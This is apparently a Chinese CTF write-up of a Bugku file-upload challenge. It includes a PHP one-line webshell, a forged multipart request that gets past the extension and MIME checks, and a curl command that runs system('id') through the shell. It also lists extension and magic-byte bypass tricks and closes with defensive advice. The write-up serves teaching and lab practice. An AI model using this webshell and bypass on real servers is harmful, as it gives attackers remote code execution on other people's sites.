Bugku 文件上传测试：改掉后缀就好

2026-10-09 · 约 8 分钟 · Bugku

上传 php 被拒，提示「不是图片」。服务端只看后缀和类型，那就让它看到它想看的 —— 这篇记一下怎么确认它到底在校验什么，以及怎么把两处一起骗过去。

题目信息

平台Bugku CTF 练习平台
类型Web / 文件上传
知识点multipart 表单、Content-Type、后缀白名单、解析漏洞
工具Burp Suite、浏览器

第一次上传：被拦下

页面是一个很朴素的上传表单，input type="file" 加一个提交按钮，没有任何前端限制：没禁用按钮，没校验 accept，也没在 onchange 里检查后缀。这种「前端什么都不管」的表单，通常意味着后端会管，而且管得比较粗暴。

我写了一个最小的一句话木马，存成 shell.php，直接提交： 

<?php @eval($_POST['cmd']); ?>

结果被弹回来，提示「文件不是图片」。这句话信息量不小：它没有说「后缀不允许」，而是说「不是图片」，说明服务端至少检查了类型，很可能检查的是 multipart 里的 Content-Type，而不是文件内容本身。

换一张真图片：通过了

为了把「类型检查」和「内容检查」区分开，我做了一个对照实验：先传一张真实的 png，成功；再把这张 png 重命名成 shell.php 上传，又被拒。这说明它看的不是文件内容（内容明明还是 png），而是文件名的后缀。接着把 shell.php 的 Content-Type 改掉，才终于通过 —— 两个检查点都摸清了。

把过程记成一句话：阻断点有两个，一个是后缀，一个是 MIME。只改一个会被另一个拦住，必须同时改。很多同学在这里卡住，就是因为只改了 filename，没动 Content-Type，或者反过来。

抓包改 filename 和 Content-Type

用 Burp 拦截上传请求，原始报文大概长这样： 

POST /upload.php HTTP/1.1
Host: 靶机地址
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAbC123

------WebKitFormBoundaryAbC123
Content-Disposition: form-data; name="file"; filename="shell.png"
Content-Type: image/png

<?php @eval($_POST['cmd']); ?>
------WebKitFormBoundaryAbC123--

注意这里文件名写 shell.png、类型写 image/png，但文件内容其实是一句话木马。服务端如果只信这两行元数据，就会把它当成图片放行，落到磁盘上却是一个 .php 或者 .png 文件 —— 关键看你把 filename 改成什么。

这一次我把 filename 改成 shell.php，Content-Type 保留 image/png 不动： 

Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

放行，返回上传路径。也就是说，它的判断是「类型是图片就算图片」，完全没有回头看一眼这个文件叫 .php，也没有检查文件头是不是 89 50 4E 47。

服务端到底校验了什么

复盘一下这几种常见校验，以及它们各自怎么被绕：

  • 只校验 Content-Type：改请求里的 MIME 即可，服务端拿到的本来就是客户端说了算的字符串。
  • 只校验后缀黑名单：换成 .phtml、.php5、.PhP，或者大小写混写、加空格加点。
  • 只校验后缀白名单：找解析漏洞，比如 shell.php.jpg 在特定配置下仍会被当 php 执行。
  • 校验文件头（magic bytes）：在木马前面加 GIF89a，做成图片马，再配合解析漏洞或者文件包含。

这道题属于最前面的两种叠加：后缀和 MIME 各查一次，但两次都只查了「声明」，没查「事实」。声明是客户端可以随便写的，所以这种校验等于没有。

连接与验证

拿到回显的路径之后，先别急着高兴，确认文件真的落地并且能被解析。访问 http://靶机地址/upload/shell.php，看到空白页说明 php 被执行了；如果直接下载或者显示源码，说明目录没开解析，得换思路。然后用 POST 传参验证： 

curl -X POST "http://靶机地址/upload/shell.php" -d "cmd=system('id');"

回显里有 uid=33(www-data) 这样的结果，就说明命令执行成功。这一步也能顺便判断权限：能不能读 /flag、能不能列目录、是不是在容器里。养成「先 id 再找 flag」的顺序，比一上来乱翻要稳。

上传题的本质是「服务端相信了客户端提供的元数据」。文件名、MIME、甚至图片尺寸都可以伪造，唯一不好伪造的是文件内容本身 —— 所以防御要往内容上做。

踩坑与复盘

  • 第一次只改了 filename，Content-Type 还是 application/x-php，被类型检查拦住，误以为是后缀白名单。
  • 试过 shell.php.jpg，这题不认，说明它不是解析漏洞型，纯粹是判断写错。
  • 上传成功后访问 404，查了半天发现路径大小写和回显不一致，按回显的原文复制才通。

防御建议

上传功能不要相信客户端的任何声明：后缀用白名单，MIME 只作为辅助，真正的判断要看文件头魔数，并且用图片库重新渲染一遍来销毁可能夹带的代码。文件落地时统一重命名成随机串加安全后缀，上传目录关闭脚本解析（nginx 里 location 不转发给 PHP-FPM），目录权限设为只读。最后，上传目录和站点主目录分离，别让一个上传点变成 getshell 的入口。
